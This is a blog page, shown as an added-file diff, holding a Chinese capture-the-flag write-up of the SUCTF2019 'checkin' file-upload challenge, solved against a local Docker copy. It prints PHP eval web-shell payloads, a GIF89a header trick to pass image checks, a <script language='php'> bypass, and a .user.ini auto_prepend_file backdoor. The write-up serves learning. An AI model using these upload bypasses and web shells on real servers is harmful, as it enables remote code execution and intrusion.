@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>SUCTF2019_checkin | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SUCTF2019_checkin</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2019-12-25&nbsp;&nbsp;17:08:57</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>这道题是SUCTF2019的一道题，看了网上的WP，说这是一道签到题… 我对PHP的熟悉的敏感程度还很低，这道题又学到了新的知识。</p>
+<p>从github上下载了源码，利用docker来复现，因为要用burpsuite抓包不太方便，所以我绑定了本地的端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/11.png" alt="img"></p>
+<p>docker容器启动后，容器中运行一些网络应用时，可以用-p或者-P参数来指定端口映射。使用-P（大写）选项，docker会随机选择一个端口映射到容器内部开放的网络端口上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run -d -P checkin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/12.png" alt="img"></p>
+<p>访问<a href="http://your-ip/32774，看到了一个文件上传的页面" target="_blank" rel="noopener">http://your-ip/32774，看到了一个文件上传的页面</a></p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/0.png" alt="img"></p>
+<p>上传一个含有<code>&lt;?php eval(@_POST[&#39;pass&#39;]); ?&gt;</code>的php文件试试，发现返回<strong>illegal suffix!</strong>，尝试了php5，php6都不行，当然也不可能会这么简单…</p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/1.png" alt="img"></p>
+<p>换其他的后缀，比如txt，这时就发现错误提示变成了<code>&amp;lt;? in contents!</code>，程序会检测你上传的文件中是不是包含<code>&lt;?</code>。</p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/2.png" alt="img"></p>
+<p>再继续换掉上传文件的内容</p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/3.png" alt="img"></p>
+<p>这里是调用了函数<code>exif_imagetype</code>来检测，这个函数会读取图像的<strong>第一个字节</strong>并且检查其签名，如果不是图像则会返回FALSE。</p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/13.png" alt="img"></p>
+<p>所以在文件的前面加上<code>GIF89a</code>来逃过检测，这时发现已经上传成功了</p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/4.png" alt="img"></p>
+<p>至于无法如何绕开<code>&lt;?</code>，我们可以用下面的语句来代替</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;</span><br><span class="line">	eval(@_POST[&#39;pass&#39;]);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/6.png" alt="img"></p>
+<p>根据提示我们应该去目录<code>uploads/18797edfc10ea8fc679eb9df684c6307</code>下面访问我们的文件，访问<a href="http://192.168.220.129:32774/uploads/18797edfc10ea8fc679eb9df684c6307/shell.jpg发现无法正常读取这个文件，当然无法正常读取，毕竟这本身就不是一个正常的可以显示的图片。" target="_blank" rel="noopener">http://192.168.220.129:32774/uploads/18797edfc10ea8fc679eb9df684c6307/shell.jpg发现无法正常读取这个文件，当然无法正常读取，毕竟这本身就不是一个正常的可以显示的图片。</a></p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/14.png" alt="img"></p>
+<p>正常思路应该是上传一个<code>.htaccess</code>将图片图片解析为php，<code>.htaccess</code>是apache的httpd.conf配置文件，但是在这道题目里是不可取的，原因是这里用的服务器不是apache而是nginx。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; wget -S 可以读取目标网页的一些信息</span><br><span class="line">$ wget -S url</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/5.png" alt="img"></p>
+<p>到这里就引出了这道题的考点——<strong>.user.ini</strong></p>
+<p>.htaccess是Apache HTTP Server的文件目录系统级别的配置文件的默认的名字，它提供了在主配置文件中定义用户自定义指令的支持。也就是说.htaccess仅在服务器为Apache时生效。相比.htaccess，<code>.user.ini</code>作为后门的使用范围就更加广泛了，无论是nginx、apache或者是IIS，只要是以fastcgi运行的php都可以支持<code>.user.ini</code>，它不像.htaccess有局限性。</p>
+<p>下面是官网中关于.user.ini的解释， 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录 。也就是说，我们可以通过自己上传<code>.user.ini</code>来控制该文件夹的各个权限，里面的具体参数可以在<code>php.ini</code>中参考。</p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/15.png" alt="img"></p>
+<p>php.ini配置选项列表中有两个特别的参数：<code>auto_append_file</code>和<code>auto_prepend_file</code>。</p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/16.png" alt="img"></p>
+<p>auto_prepend_file参数能指定一个特定的文件，自动包含在要执行的文件前，类似在文件前调用了require()函数，auto_append_file类似，是在文件的后面进行文件包含。</p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/17.png" alt="img"></p>
+<p>所以我们需要上传一个<code>.user.ini</code>文件，其中指定<code>auto_prepend_file</code>参数为我们的图片木马，这样图片木马就会被解析为php文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/7.png" alt="img"></p>
+<p>重新上传shell.jpg读取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;</span><br><span class="line">	system(&#39;cat &#x2F;flag&#39;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/8.png" alt="img"></p>
+<p>访问url：<a href="http://192.168.220.129:32774/uploads/18797edfc10ea8fc679eb9df684c6307/index.php读取flag。" target="_blank" rel="noopener">http://192.168.220.129:32774/uploads/18797edfc10ea8fc679eb9df684c6307/index.php读取flag。</a></p>
+<p><img src="/2019/12/25/[SUCTF2019]checkin/imgs/9.png" alt="img"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2019/12/25/[SUCTF2019]checkin/">https://bantttian.github.io/2019/12/25/[SUCTF2019]checkin/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/01/05/WooYun-2016-171624-wecenter3.17%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">WooYun-2016-171624 wecenter 3.17 反序列化漏洞</a>
+            
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
